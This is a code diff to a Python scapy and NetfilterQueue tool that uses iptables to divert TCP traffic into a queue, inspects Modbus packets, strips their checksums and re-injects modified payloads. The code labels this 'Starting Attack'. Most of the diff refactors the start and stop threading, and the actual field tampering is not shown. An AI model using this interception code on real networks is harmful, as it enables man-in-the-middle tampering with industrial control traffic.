@@ -1,3 +1,4 @@
+import time
 import scapy.all as scapy 
 import threading
 from scapy.layers.inet import TCP
@@ -257,8 +258,11 @@ class packet_options:
 
 class net_filter_queue:
 
+    def stop():
+        net_filter_queue.stop_event.set()
+        net_filter_queue.process.join(timeout=2)
+
     def packet_listener(packet):
-    
     
         pl=IP(packet.get_payload())
 
@@ -274,9 +278,6 @@ class net_filter_queue:
         if mb.is_modbus(pl):
 
             mb.print_scannable(pl, show_transId=True, convert=True)
-        
-        
-
 
         del pl[TCP].chksum
         del pl[IP].chksum
@@ -288,37 +289,44 @@ class net_filter_queue:
       
         
         #pl.show()  
-        scapy.send(pl)
+        packet.set_payload(bytes(pl))
         packet.accept()
-            
+
+        '''
+        packet.drop()
+        scapy.send(pl)
+        '''            
+        
     def __setdown():
         os.system("sudo iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1") 
 
-    def start():
-
+    def start_worker(stop_event):
         os.system("sudo iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")
-        os.system("sudo iptables -L")
-        queue = nfq.NetfilterQueue()
 
+        queue = nfq.NetfilterQueue()
         queue.bind(1, net_filter_queue.packet_listener)
 
-
+        print("Starting Attack")
 
         try:
-            print("Starting Attack")
-            # Check for net_filter_queue.running before each loops
-            queue.run()
-        except KeyboardInterrupt:
-            net_filter_queue.__setdown()
-            print("stopping sniffing")
+            while not stop_event.is_set():
+                queue.run(block=False)
+                time.sleep(0.01)
+        finally:
+            print("Stopping sniffing")
             queue.unbind()
+            net_filter_queue.__setdown()
 
-    def dstart():
-        p = Process(target=net_filter_queue.start_worker, daemon=True)
+    def start():
+        stop_event = Event()
+        net_filter_queue.stop_event = stop_event
+        p = Process(
+            target=net_filter_queue.start_worker,
+            args=(stop_event,),
+            daemon=True
+        )
         p.start()
-
-    def dstop():
-        net_filter_queue.running = False
+        net_filter_queue.process = p
 
 class scapy_sniffing:
         
